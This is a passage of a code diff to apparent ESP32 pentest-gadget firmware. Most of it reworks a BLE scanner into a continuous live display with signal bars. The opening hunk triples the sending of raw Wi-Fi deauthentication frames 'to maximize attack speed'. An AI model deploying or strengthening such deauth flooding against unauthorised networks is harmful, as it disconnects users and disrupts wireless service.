     esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-    deauthPacketsSent++;
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    deauthPacketsSent += 3;
   }
   
-  // Update display less frequently to maximize attack speed
+  // Update display ONLY every 500ms to maximize attack speed
   static unsigned long lastDisplayUpdate = 0;
   if (millis() - lastDisplayUpdate > 500 && currentState == WIFI_ATTACK_MENU) {
     int y = HEADER_HEIGHT + 35 + (2 * (BUTTON_HEIGHT + BUTTON_SPACING)) + 35;
@@ -1731,7 +2071,19 @@ void scanBLEDevices() {
   }
   
   tft.fillScreen(COLOR_BG);
-  drawHeader("BLE SCAN");
+  
+  // Header with live indicator
+  tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
+  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
+  
+  tft.setTextColor(COLOR_TEXT);
+  tft.setTextSize(2);
+  tft.setCursor(10, 10);
+  tft.print("BLE SCAN");
+  
+  static bool blink = false;
+  blink = !blink;
+  tft.fillCircle(SCREEN_WIDTH - 15, 17, 4, blink ? COLOR_SUCCESS : COLOR_WARNING);
   
   tft.setTextSize(2);
   tft.setTextColor(COLOR_ACCENT);
@@ -1743,7 +2095,7 @@ void scanBLEDevices() {
   tft.setCursor(80, 145);
   tft.println("Please wait...");
   
-  addToConsole("BLE scan started");
+  addToConsole("BLE continuous scan started");
   
   BLEDevice::init("");
   pBLEScan = BLEDevice::getScan();
@@ -1752,30 +2104,45 @@ void scanBLEDevices() {
   pBLEScan->setInterval(100);
   pBLEScan->setWindow(99);
   
-  BLEScanResults foundDevices = pBLEScan->start(bleScanTime, false);
-  bleDeviceCount = foundDevices.getCount();
-  if (bleDeviceCount > 50) bleDeviceCount = 50;
+  // Start continuous scan
+  continuousBLEScan = true;
+  pBLEScan->start(0, nullptr, false);  // 0 = infinite scan
   
-  for (int i = 0; i < bleDeviceCount; i++) {
-    BLEAdvertisedDevice device = foundDevices.getDevice(i);
-    bleDevices[i].address = device.getAddress().toString().c_str();
-    bleDevices[i].name = device.haveName() ? device.getName().c_str() : "Unknown";
-    bleDevices[i].rssi = device.getRSSI();
-  }
+  delay(3000);  // Initial scan period
   
-  pBLEScan->clearResults();
-  
-  addToConsole("Found " + String(bleDeviceCount) + " BLE devices");
   displayBLEScanResults();
 }
 
 void displayBLEScanResults() {
   currentState = BLE_SCAN_RESULTS;
   tft.fillScreen(COLOR_BG);
-  drawHeader("BLE DEVICES");
   
-  int y = HEADER_HEIGHT + 10;
-  int displayCount = (bleDeviceCount > 5) ? 5 : bleDeviceCount;
+  // Header with live indicator
+  tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
+  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
+  
+  tft.setTextColor(COLOR_TEXT);
+  tft.setTextSize(2);
+  tft.setCursor(10, 10);
+  tft.print("BLE LIVE");
+  
+  static bool blink = false;
+  blink = !blink;
+  tft.fillCircle(SCREEN_WIDTH - 15, 17, 4, blink ? COLOR_SUCCESS : COLOR_WARNING);
+  
+  // Status
+  int statusY = HEADER_HEIGHT + 5;
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_ACCENT);
+  tft.setCursor(SIDE_MARGIN, statusY);
+  tft.printf("Devices: %d", bleDeviceCount);
+  
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SCREEN_WIDTH - 60, statusY);
+  tft.print("LIVE");
+  
+  int y = HEADER_HEIGHT + 25;
+  int displayCount = (bleDeviceCount > 6) ? 6 : bleDeviceCount;
   
   for (int i = 0; i < displayCount; i++) {
     tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_ITEM_BG);
@@ -1786,24 +2153,30 @@ void displayBLEScanResults() {
     tft.setCursor(SIDE_MARGIN + 5, y + 5);
     
     String displayName = bleDevices[i].name;
-    if (displayName.length() > 28) {
-      displayName = displayName.substring(0, 28);
+    if (displayName.length() > 24) {
+      displayName = displayName.substring(0, 24);
     }
     tft.println(displayName);
     
-    tft.setCursor(SIDE_MARGIN + 5, y + 18);
+    // Signal bar
+    int rssi = bleDevices[i].rssi;
+    int barWidth = map(constrain(rssi, -100, -30), -100, -30, 5, 60);
+    uint16_t barColor = (rssi > -50) ? COLOR_SUCCESS : (rssi > -70) ? COLOR_WARNING : COLOR_CRITICAL;
+    
+    tft.fillRect(SIDE_MARGIN + 5, y + 20, barWidth, 4, barColor);
+    
     tft.setTextColor(COLOR_ACCENT);
-    tft.print(bleDevices[i].rssi);
-    tft.print(" dBm");
+    tft.setCursor(SIDE_MARGIN + 70, y + 18);
+    tft.printf("%d dBm", rssi);
     
     y += 34;
   }
   
-  if (bleDeviceCount > 5) {
+  if (bleDeviceCount > 6) {
     tft.setTextColor(COLOR_ACCENT);
     tft.setTextSize(1);
     tft.setCursor(90, y + 5);
-    tft.printf("+ %d more...", bleDeviceCount - 5);
+    tft.printf("+ %d more...", bleDeviceCount - 6);
   }
   
   drawBackButton();
